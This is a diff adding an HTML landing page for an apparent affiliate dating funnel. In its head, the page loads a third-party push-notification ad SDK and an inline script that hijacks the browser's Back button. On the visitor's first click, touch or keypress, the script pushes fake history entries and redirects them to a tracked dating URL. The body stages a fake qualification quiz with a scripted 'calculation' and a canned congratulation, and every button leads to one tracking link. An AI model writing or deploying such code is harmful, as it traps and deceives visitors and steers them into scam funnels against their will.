@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <meta charset="UTF-8" />
+      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="stylesheet" href="css/leaflet.css"/>
+      <link media="all" href="css/style.css" rel="stylesheet">
+      <title>Find your date!</title>
+
+
+<!--Rollerads-->
+<script async data-cfasync="false">
+  (function() {
+      const url = new URL(window.location.href);
+      const clickID = url.searchParams.get("click_id");
+      const sourceID = url.searchParams.get("source_id");
+
+      const s = document.createElement("script");
+      s.dataset.cfasync = "false";
+      s.src = "https://sdk4push.com/f/sdk.js?z=1238026";
+      s.onload = (opts) => {
+          opts.zoneID = 1238026;
+          opts.extClickID = clickID;
+          opts.subID1 = sourceID;
+          opts.actions.onPermissionGranted = () => {};
+          opts.actions.onPermissionDenied = () => {};
+          opts.actions.onAlreadySubscribed = () => {};
+          opts.actions.onError = () => {};
+      };
+      document.head.appendChild(s);
+  })()
+</script>
+
+ <!--iMonetizerIt-->
+
+<script> function imiBB() { let url = "https://me.1ondate.com/?utm_source=da57dc555e50572d&s1=193382&s2=2012954&ban=banner&j1=1"; try { history.pushState({}, '', location.href); history.pushState({}, '', location.href); window.onpopstate = function (ev) { if (ev['state']) { location.replace(url); } }; } catch (ex) {} } !function () { let touched = false; let chromeVersion = 0; try { chromeVersion = +(new RegExp('Chrome/([0-9]+)').exec(navigator.userAgent)[1]); } catch (e) { chromeVersion = 0; } if (chromeVersion >= 75) { window.addEventListener('mouseup', function () { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); document.addEventListener("DOMContentLoaded", function () { document.body.addEventListener('touchend', function (evt) { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); document.body.addEventListener('keydown', function () { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); } ); } else { setTimeout(function () { imiBB(); } , 0); } } (); </script>
+
+
+
+
+</head>
+   <body>
+      <div id="map" class="map"></div>
+      <div class="first__popup" id="firstPopup">
+         <section class="quiz__main" id="quiz">
+            <div class="start-button" id="start-button-box">
+               <p> Find out within 30 seconds if you qualify for our community. <br /><br /> You will receive an immediate acceptance or refusal following this test.</p>
+               <button class="button" id="start-button">Start</button>
+            </div>
+            <h2 class="question" id="question"></h2>
+            <div class="buttons-box" id="answer-buttons"></div>
+            <div class="buttons-box__links" id="answer-buttons__links">
+               <blockquote> <span></span> Thank you. Please push at the next step the "Submit" button so that your answers can be
+                  evaluated. Afterwards we will let you know if you are allowed to join our community..
+               </blockquote>
+               <button class="button" id="btn">Submit</button>
+            </div>
+            <div class="loading-gif" id="loading-gif" style="display: none;">
+               <h3>Calculation in progress ... please wait</h3>
+            </div>
+            <div id="result-message" class="result-message" style="display: none;">
+               <p>Congratulations! You are part of the <span id="result-percentage"></span>% of men who have successfully
+                  completed the test and have qualified for the final round.
+               </p>
+               <a href="https://tkr.1ondate.com/cool.php?lp=1" target="_parent" class="button">Continue</a>
+            </div>
+         </section>
+      </div>
+      <div class="popup-wrapper hide">
+         <div class="popup" id="modelPopup">
+            <button class="popup__close" onclick="closePopup()">&#10006;</button>
+            <div class="popup__inner">
+               <div class="popup__image" id="image"> <img src="" alt="model" class="popup__image__item"
+                  id="modelImage" /></div>
+               <div class="popup__content">
+                  <div class="popup__content__row">
+                     <h4 class="popup__content__title"> <span id="modelName"></span></h4>
+                     <p class="popup__content__text"> Age: <span id="modelAge"></span></p>
+                  </div>
+                  <div class="popup__content__row">
+                     <p class="popup__content__text"> Zodiac: <span id="modelZodiac"></span></p>
+                     <p class="popup__content__text"> Height: <span id="modelHeight"></span></p>
+                  </div>
+                  <div class="popup__content__row">
+                     <p class="popup__content__text"> Weight: <span id="modelWeight"></span></p>
+                     <p class="popup__content__text"> Relationship Status: <span id="modelRelationship"></span></p>
+                  </div>
+                  <p class="popup__content__text popup__content__text--last"> Looking For An Age Group: <span id="modelLookingForAge"></span></p>
+                  <a href="https://tkr.1ondate.com/cool.php?lp=1" target="_parent" class="popup__button popup__button--desktop">Let's chat</a> <a href="https://tkr.1ondate.com/cool.php?lp=1" target="_parent" class="popup__button popup__button--desktop">See others</a>
+               </div>
+            </div>
+            <a href="https://tkr.1ondate.com/cool.php?lp=1" target="_parent" class="popup__button popup__button--mobile">Let's chat</a> <a href="https://tkr.1ondate.com/cool.php?lp=1" target="_parent" class="popup__button popup__button--mobile">See others</a>
+         </div>
+      </div>
+      <script src="js/leaflet.js"></script>
+      <script src="js/app.js"></script>
+      <script src="js/questions.js"></script> 
+   </body>
+</html>
